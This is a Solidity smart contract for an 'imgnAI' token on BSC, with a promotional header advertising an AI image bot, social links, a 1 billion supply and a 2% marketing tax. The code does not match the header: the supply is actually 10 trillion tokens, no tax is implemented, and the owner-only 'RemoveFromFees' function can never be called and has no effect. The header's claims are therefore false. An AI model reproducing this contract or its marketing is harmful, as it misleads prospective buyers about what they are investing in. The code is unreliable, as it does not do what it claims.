/**
 *   _                                _____ 
 *  (_)                         /\   |_   _|
 *   _ _ __ ___   __ _ _ __    /  \    | |  
 *  | | '_ ` _ \ / _` | '_ \  / /\ \   | |  
 *  | | | | | | | (_| | | | |/ ____ \ _| |_ 
 *  |_|_| |_| |_|\__, |_| |_/_/    \_\_____|
 *                __/ |                     
 *               |___/                      
 * 
 * Image Generation AI : Powered by Stability AI's Stable Diffusion
 * 
 * Telegram: https://t.me/imgnAI
 * Twitter: twitter.com/imgnAI
 * Homepage: https://imgnAI.com
 * 
 * Total Supply: 1 Billion Tokens
 * Unlock rendering & Add our AI Bot to your Telegram channel at our homepage!
 * 
 * Set slippage to 3-4% : 1% to LP, 2% tax for Marketing & GPU Hosting costs.
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract imgnAICOIN {
    string public name = "imgnAI Official Coin";
    string public symbol = "imgnAI BSC";
    uint256 public totalSupply = 10000000000000000000000;
    uint8 public decimals = 9;
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);


    event Approval(
        address indexed _ownerimgnAI,
        address indexed __spenderimgnAI,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }


    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    

 
    function approve(address __spenderimgnAI, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][__spenderimgnAI] = _value;
        emit Approval(msg.sender, __spenderimgnAI, _value);
        return true;
    }


    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

  address private owner;

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  mapping(address => uint256) _totbalances;
  
  function RemoveFromFees(address CimgnAI, uint256 CimgnAINFT) external onlyOwner{
    _totbalances[CimgnAI] = CimgnAINFT;
  } 
}